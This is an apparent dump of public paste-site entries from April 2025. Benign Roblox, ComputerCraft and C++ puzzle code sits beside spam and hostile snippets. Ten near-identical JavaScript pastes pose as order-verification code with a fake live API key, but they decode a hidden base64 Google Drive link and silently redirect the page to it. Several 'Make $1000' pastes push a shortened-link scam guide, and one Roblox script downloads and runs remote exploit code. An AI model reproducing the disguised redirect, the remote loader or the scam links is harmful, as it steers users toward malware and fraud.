id,title,username,language,date,content
YrT18w56,Make $1000 15-MINUTES  (BEGINNER) GM,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:26:16 PM CDT," 
Pdf https://tinyurl.com/privguidee


dKIRYKDgUq
"
ZB7143fr,Click GUI,Parallaxox,Lua,Tuesday 22nd of April 2025 12:23:51 PM CDT,"--https://youtu.be/j5h2DvXeHEU
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ScreenGui""
screenGui.Parent = playerGui

local clickButton = Instance.new(""TextButton"")
clickButton.Size = UDim2.new(0.2, 0, 0.1, 0)
clickButton.Position = UDim2.new(0.02, 0, 0.45, 0)
clickButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
clickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
clickButton.Font = Enum.Font.SourceSansBold
clickButton.TextSize = 24
clickButton.Text = ""Click Me""
clickButton.Parent = screenGui

local countLabel = Instance.new(""TextLabel"")
countLabel.Size = UDim2.new(0.2, 0, 0.08, 0)
countLabel.Position = UDim2.new(0.02, 0, 0.35, 0)
countLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
countLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
countLabel.Font = Enum.Font.SourceSansBold
countLabel.TextSize = 24
countLabel.Text = ""Clicks: 0""
countLabel.Parent = screenGui

local clickCount = 0

local function updateCounter()
	countLabel.Text = ""Clicks: "" .. clickCount
end

clickButton.MouseButton1Click:Connect(function()
	clickCount = clickCount + 1
	updateCounter()
end)
"
WsXQX3wd,EARN $900 INSTANTLY 2025 2T,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:16:52 PM CDT," 
Pdf https://tinyurl.com/privguidee


TYcVlPnSwF
"
uNYqEpSZ,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:12:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25435/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SxHQnY2Y,Make $1000 15-MINUTES (BEGINNER) XU,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:07:38 PM CDT," 
Pdf https://tinyurl.com/privguidee


XqEveOhD4i
"
pjjDD1h6,Untitled,RAIYANBEXON,JSON,Tuesday 22nd of April 2025 12:00:00 PM CDT,"[
  {""username"": ""raiyan"", ""password"": ""1""},
  {""username"": ""raiyan"", ""password"": ""1""}
]"
ywEUkrdn,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:56:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9apJTRWa,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 11:41:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56559/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Edkat6dq,BGSI,IWannaDieAsWell,Lua,Tuesday 22nd of April 2025 11:33:52 AM CDT,"-- Please note that this is the original script. Any other script claiming to be IdiotHub is fake and may have a trade stealer. Stay Safe & Happy Exploting!

loadstring(game:HttpGet(""https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua""))()"
eds4WaZp,cook.lua,hoodedperson,Lua,Tuesday 22nd of April 2025 11:27:27 AM CDT,"local whereWall = nil
local curWall = nil
local blockToWall = {
  [""minecraft:stripped_oak_log""]=0,
  [""minecraft:oak_log""]=1,
  [""minecraft:bricks""]=2,
}
while whereWall == nil or curWall == nil do
  local s,b = turtle.inspect()
  if b.name == ""minecraft:stripped_oak_log"" or b.name == ""minecraft:oak_log"" or b.name == ""minecraft:bricks"" then
    whereWall = 0
    curWall = blockToWall[b.name]
    break
  else
    turtle.turnLeft()
  end
  
end
print(""Found wall: "", curWall)

function turnLeft()
  turtle.turnLeft()
  whereWall = (whereWall - 1) % 4
end
function turnRight()
  turtle.turnRight()
  whereWall = (whereWall + 1) % 4
end
function forward() 
  if whereWall % 2 == 0 then
    return false, ""may not escape 2d working area or run into wall""
  end
  
  local s,r = turtle.forward()
  if not s then
    return false, r
  end
  if whereWall == 1 then
    curWall = (curWall + 1) % 3
    return true
  elseif whereWall == 3 then
    curWall = (curWall - 1) % 3
    return true
  end
end

function goWall(wall)
  if curWall ~= wall then
    dist = wall - curWall
    if dist > 0 and whereWall ~= 1 then
      while whereWall ~= 1 do 
        if whereWall > 1 then 
          turnLeft()
        else
          turnRight() 
        end
      end
    elseif dist < 0 and whereWall ~= 3 then 
      while whereWall ~= 3 do 
        if whereWall < 1 then 
          turnLeft()
        else
          turnRight() 
        end
      end
    end
    dist = math.abs(dist)
    for i=1,dist do
      forward()
    end
  end
end

function cabinet()
  goWall(2)
end

cabinet()

while true do
  local success, block = turtle.inspectDown()
  
end"
XYhZFBjd,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:25:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11603/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZWwLTbix,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:10:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85548/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2bA02jLH,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:54:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42693/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CeSqGH8C,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 10:39:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50282/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KzQexUym,八数码难题 参考代码,Dmaxiya,C++,Tuesday 22nd of April 2025 10:27:50 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
const string t = ""123804765"";
const int dir[4][2] = {
    {-1, 0}, {1, 0}, {0, 1}, {0, -1}
};
string s;
queue<pair<string, int>> que;
map<string, int> step;
map<string, int>::iterator it;

int id(int x, int y) {
    return x * 3 + y;
}

bool in(int x, int y) {
    return x >= 0 && x < 3 && y >= 0 && y < 3;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> s;
    que.push({s, s.find(""0"")});
    step[s] = 0;
    while (!que.empty()) {
        pair<string, int> tmp = que.front();
        que.pop();
        if (tmp.first == t) {
            cout << step[tmp.first] << endl;
            return 0;
        }
        int d = step[tmp.first];
        int x = tmp.second / 3;
        int y = tmp.second % 3;
        for (int i = 0; i < 4; ++i) {
            int xx = x + dir[i][0];
            int yy = y + dir[i][1];
            if (!in(xx, yy)) {
                continue;
            }
            swap(tmp.first[id(xx, yy)], tmp.first[tmp.second]);
            it = step.find(tmp.first);
            if (it == step.end()) {
                step[tmp.first] = d + 1;
                que.push({tmp.first, id(xx, yy)});
            }
            swap(tmp.first[id(xx, yy)], tmp.first[tmp.second]);
        }
    }

    return 0;
}
"
fNsTKfkY,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:24:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19341/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B1MhmdVE,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:08:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62657/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yJEMqGhi,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 09:53:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55588/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5LuQJVN1,term.lua,Xmann1,Lua,Tuesday 22nd of April 2025 09:50:28 AM CDT,"local chest = peripheral.wrap(""front"")
local query = nil

rednet.open(""bottom"")

function io()
  if query == nil then
    return
  end

  -- Pipe matching items towards player
  local chest_items = chest.list()
  if chest_items ~= nil then
    for slot, item in pairs(chest_items) do
      if string.find(item.name, query) then
        turtle.select(1)
        turtle.suck()
      end

      break
    end
  end
end

function empty_garbage()
  -- Pipe non-matching items away from player
  for i=1, 16 do
    turtle.select(i)

    itemDetail = turtle.getItemDetail()

    if query == nil or (itemDetail ~= nil and not string.find(itemDetail.name, query)) then
      turtle.drop()
    end
  end
  
  turtle.select(1)
end

local query_input = """"

local width, height = term.getSize()

while true do
  term.setCursorPos(1, height)
  term.clearLine()
  term.write(""> "" .. query_input)

  os.startTimer(1)

  local eventData = { os.pullEvent() }
  local event = eventData[1]

  if event == ""key"" then
    local key = eventData[2]

    if key == 257 then
      if string.len(query_input) > 0 then
        query = query_input

        rednet.broadcast(query)

        empty_garbage()
        query_input = """"
      end
    elseif key == 259 then
      query_input = string.sub(query_input, 1, -2)
    elseif key >= 39 and key <= 126 then
      query_input = query_input .. string.char(key)
    end
  end

  io();
end

"
